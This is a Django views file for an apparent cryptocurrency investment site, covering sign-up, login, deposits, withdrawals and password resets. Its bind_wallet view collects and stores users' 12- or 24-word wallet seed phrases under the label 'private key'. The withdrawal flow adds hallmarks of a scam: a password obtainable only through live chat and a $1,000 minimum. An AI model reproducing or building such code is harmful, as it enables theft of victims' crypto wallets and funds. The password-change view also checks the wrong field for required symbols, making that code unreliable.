from django.shortcuts import render, redirect
from .models import *
from .form import *
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from django.conf import settings
from django.core.mail import EmailMessage
from django.utils import timezone
from decouple import config


User = get_user_model()


def create_account(request):

    if request.user.is_authenticated:
        return redirect('dashboard')

    if request.method == 'POST':

        email = request.POST.get('email')
        full_name = request.POST.get('full-name')
        country = request.POST.get('country')
        password = request.POST.get('password')
        confirm_password = request.POST.get('confirm-password')

        field = [full_name, email,
                 country, password, confirm_password]

        password_has_error = False
        if not all(field):
            password_has_error = True
            messages.error(request, 'All field are required')

        else:

            if User.objects.filter(email=email).exists():
                password_has_error = True
                messages.error(request, 'Email already exist')

            else:
                if password != confirm_password:
                    password_has_error = True
                    messages.error(request, "Password doesn't match")
                else:
                    if len(password) <= 5:
                        password_has_error = True
                        messages.error(request, 'Password must be greater 5 ')

            if not password_has_error:
                User.objects.create_user(
                    email=email,
                    full_name=full_name,
                    country=country,
                    password=password,
                )

                messages.success(request, 'Account has been created, Login!')
                return redirect('login')

    return render(request, 'users/create-account.html')


def loginview(request):
    if request.user.is_authenticated:
        return redirect('dashboard')
    form = LoginForm()
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']

            user = authenticate(request, username=email, password=password)

            if user is not None:
                login(request, user)
                return redirect('dashboard')
            else:
                messages.error(request, 'Invalid Credentials')
    context = {'form': form}
    return render(request, 'users/login.html', context)


def logoutview(request):
    logout(request)
    return redirect('login')


@login_required
def dashboard(request):
    dashbord = Dashboard.objects.get(user=request.user)
    context = {'dashbord': dashbord}
    return render(request, 'users/dashboard.html', context)


@login_required
def withdrawal_history(request):
    withdrawal_history = Withdraw.objects.filter(
        user=request.user).order_by('-created_on')
    context = {
        'withdrawal_history': withdrawal_history
    }
    return render(request, 'users/withdrawal-history.html', context)


@login_required
def bind_wallet(request):
    form = Bind_wallet_form()
    has_error = True
    if request.method == 'POST':
        form = Bind_wallet_form(request.POST)
        if form.is_valid():
            private_key = form.cleaned_data['private_key']
            if ',' in private_key:
                private_key = private_key.split(',')
            else:
                private_key = private_key.strip('').split(' ')

            if len(private_key) == 12 or len(private_key) == 24:
                has_error = False

            if not has_error:
                obj = form.save(commit=False)
                obj.user = request.user
                obj.save()

                messages.success(request, 'Wallet will Binded')
                return redirect('dashboard')
            else:
                messages.error(
                    request, 'Invalid Private key or Invaild format')
    context = {
        'form': form
    }
    return render(request, 'users/bind-wallet.html', context)


@login_required
def withdrawal_password(request):
    uuid_password = Withdraw_password.objects.get(user=request.user)
    form = Withdrawal_pass_form()
    if request.method == 'POST':
        form = Withdrawal_pass_form(request.POST)
        if form.is_valid():
            password = form.cleaned_data['password']
            if password == str(uuid_password.password):
                request.session['has_code'] = True
                return redirect('withdraw')
            else:
                messages.error(
                    request, "Enter correct password, if you don't have one, message the livechat to get your withdrawal password")

    context = {'form': form}
    return render(request, 'users/withdrawal-password.html', context)


@login_required
def withdraw(request):
    form = WithdrawalForm()

    withdrawal_history = Withdraw.objects.filter(
        user=request.user).order_by('-created_on')

    dashboard = Dashboard.objects.get(user=request.user)

    has_code = request.session.get("has_code")

    if not has_code:
        return redirect('withdrawal_password')
    else:

        if request.method == 'POST':
            form = WithdrawalForm(request.POST)

            if form.is_valid():
                amount = form.cleaned_data['amount']
                wallet_address = form.cleaned_data['wallet_address']
                coin = form.cleaned_data['coin']

                try:

                    if amount < 1000:
                        messages.error(request,
                                       f'enter an amount greater than 1,000.00')
                    elif amount == 0:
                        messages.error(request, 'your account balance is 0')
                    else:
                        if amount > dashboard.total_bal:
                            messages.error(request,
                                           f'{amount} is greater than your avaialble balance')
                        elif amount <= dashboard.total_bal:

                            Withdraw.objects.create(
                                amount=amount, wallet_address=wallet_address, coin=coin, user=request.user)
                            del request.session["has_code"]

                            messages.success(
                                request, f' ${amount} will be deposited to your wallet:{wallet_address} ')

                            return redirect('dashboard')

                except ValueError as e:
                    form.add_error('amount', str(e))

        context = {'form': form,
                   "withdrawal_history": withdrawal_history,
                   'dashboard': dashboard
                   }
        return render(request, 'users/withdraw.html', context)


@login_required
def deposit_history(request):
    deposit_history = Deposit.objects.filter(
        user=request.user).order_by('-created_on')
    context = {
        'deposit_history': deposit_history
    }
    return render(request, 'users/deposit-history.html', context)


@login_required
def deposit_process1(request):
    form = DepositForm()
    payment_details = PaymentMethod.objects.all()
    Paymentmethod = request.POST.get('mode_of_payment')

    if request.method == 'POST':
        Paymentmethod = int(Paymentmethod)

        for payment_detail in payment_details:
            if payment_detail.id == Paymentmethod:
                Paymentmethod = Paymentmethod

        request.session['Paymentmethod'] = Paymentmethod
        return redirect('deposit')

    context = {'form': form}
    return render(request, 'users/deposit-process1.html', context)


@login_required
def deposit(request):
    deposit_history = Deposit.objects.filter(
        user=request.user).order_by('-created_on')
    payment_detail = request.session.get('Paymentmethod')
    deposit_details = PaymentMethod.objects.get(
        pk=payment_detail)

    if request.method == 'POST':
        form = DepositForm(request.POST, request.FILES)
        if form.is_valid():
            amount = form.cleaned_data['amount']
            image = form.cleaned_data['image']

            try:
                if amount <= 19:
                    messages.error(request, 'Deposit Mininum of $20')
                else:
                    payment_detail = PaymentMethod.objects.get(
                        id=payment_detail)
                    Deposit.objects.create(
                        amount=amount, image=image, mode_of_payment=payment_detail, user=request.user)
                    messages.success(
                        request, f' Your ${amount} is processing and will appear on your dashboard when completed')
                    return redirect('dashboard')
            except ValueError as e:
                form.add_error('amount', str(e))
    else:
        form = DepositForm()
    context = {'form': form,
               "deposit_history": deposit_history,
               'deposit_details': deposit_details
               }
    return render(request, 'users/deposit.html', context)


@login_required
def edit_profile(request):
    form = EditProfileForm(instance=request.user)
    if request.method == "POST":
        form = EditProfileForm(request.POST, instance=request.user)
        if form.is_valid():
            form.save()
            messages.success(request, 'Profile Sucessfully Updated')
            return redirect('dashboard')
    context = {'form': form}
    return render(request, 'users/edit-profile.html', context)


@login_required
def reset_password(request):
    form = Password_reset_form()
    user = request.user
    error_password = False

    if request.method == 'POST':
        form = Password_reset_form(request.POST)

        if form.is_valid():
            password = request.POST.get('password')
            new_password = request.POST.get('new_password')
            confirm_password = request.POST.get('confirm_password')

            if user.check_password(password):
                if new_password == confirm_password:
                    if len(new_password) <= 5:
                        error_password = True
                        messages.error(
                            request, 'password must be greater than 5')
                    else:

                        if password == '123456':
                            error_password = True
                            messages.error(
                                request, 'password is too weak')

                        is_symbol = False
                        for symbol in ['!', '@', '?', '-', '_', '|', '+', '$', '&']:
                            if symbol in password:
                                is_symbol = True

                        if not is_symbol:
                            error_password = True
                            messages.error(
                                request, 'password must have at least one of this symbol !  @ ? - _ | ')

                        if not error_password:
                            user.set_password(new_password)
                            user.save()

                            messages.success(
                                request, 'new password has been created')
                            return redirect('dashboard')

                else:
                    messages.error(request, f"password does'nt match")
            else:
                messages.error(request, 'Your previous password is incorrect')
    context = {
        'form': form
    }
    return render(request, 'users/reset-password.html', context)


def reset_password_link(request):
    if request.method == 'POST':
        email = request.POST.get('email')

        try:
            user = User.objects.get(email=email)

            password_id = PasswordID.objects.create(user=user)

            pwd_id = password_id.reset_id
            reset_pwd_url = f'{request.scheme}://{request.get_host()}/users/password-reset/{pwd_id}'

            email_body = f""" 

                Hi  {user.full_name} ,

                We received a request to reset the password for your account on {request.scheme}://{request.get_host()}.

                To reset your password, click the link below (or copy and paste it into your browser):

                {reset_pwd_url}

                This link will expire in 30 minutes. If you didn't request a password reset, you can safely ignore this email — your password will remain unchanged.

                Thanks!
                The {config('APP_NAME')}

                """

            email_message = EmailMessage(
                'Reset your password',
                email_body,
                settings.EMAIL_HOST_USER,
                [email]
            )
            email_message.fail_silently = True
            email_message.send()

        except User.DoesNotExist:
            pass

        return redirect('password-link-sent')

    return render(request, 'users/forget_password.html')


def password_link_sent(request):
    return render(request, 'users/password-link-sent.html')


def password_reset(request, pk):

    try:
        reset_id = PasswordID.objects.get(reset_id=pk)
        user = reset_id.user
        created_time = reset_id.created_on
        minute = timezone.timedelta(minutes=30)

        expiration_time = created_time + minute

        if expiration_time <= timezone.now():
            error_password = True
            messages.error(request, 'Password link expired')
            reset_id.delete()
            return redirect('reset-password-link')

        if request.method == 'POST':
            password = request.POST.get('password')
            password_confirm = request.POST.get('confirm-password')

            error_password = False

            if expiration_time <= timezone.now():
                error_password = True
                messages.error(request, 'Password link expired')
                reset_id.delete()
                return redirect('reset-password-link')
            else:

                if password != password_confirm:
                    error_password = True
                    messages.error(request, "password doesn't match")

                else:

                    if len(password) <= 5:
                        error_password = True
                        messages.error(
                            request, 'password must be greater than 5')
                    else:

                        if password == '123456':
                            error_password = True
                            messages.error(
                                request, 'password is  weak try another password')

                        if user.check_password(password):
                            error_password = True
                            messages.error(
                                request, "old password can't be new password")

                        if not error_password:
                            user.set_password(password)
                            user.save()

                            reset_id.delete()

                            messages.success(
                                request, 'new password has been created')
                            return redirect('login')

    except PasswordID.DoesNotExist:
        messages.error(
            request, "Invalid Link")
        return redirect('reset-password-link')

    return render(request, 'users/password-reset.html')


def upgrade_plans(request):
    return render(request, 'users/upgrade-plans.html')
